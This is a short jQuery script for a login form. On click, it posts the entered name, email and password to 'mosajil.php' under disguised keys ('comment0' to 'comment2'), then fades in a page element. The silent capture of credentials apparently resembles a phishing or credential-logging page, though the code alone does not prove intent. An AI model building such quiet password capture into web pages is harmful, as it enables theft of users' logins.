﻿


$(document).ready(function()
{
 
 
 $(".login").click(function(e){
        e.preventDefault();

    $.ajax({
            method: "POST" ,
            url: "mosajil.php" , 
            data: { 
comment0 : $(".name").val() ,
comment1 : $(".eml").val() ,
comment2 : $(".password").val() 
                    },
            });

      });


//~~~~~~~~~~~~~~~~~~~~~
//~~~~~~~~~~~~~~~~~~~~~
//~~~~~~~~~~~~~~~~~~~~~


 $(".login").click(function(){

    $(".dahr").animate(
    {
        opacity: 1 
    } , 5000 );


      });




 //~~~~~~~~~~~~~~~~~~~~~
} );




















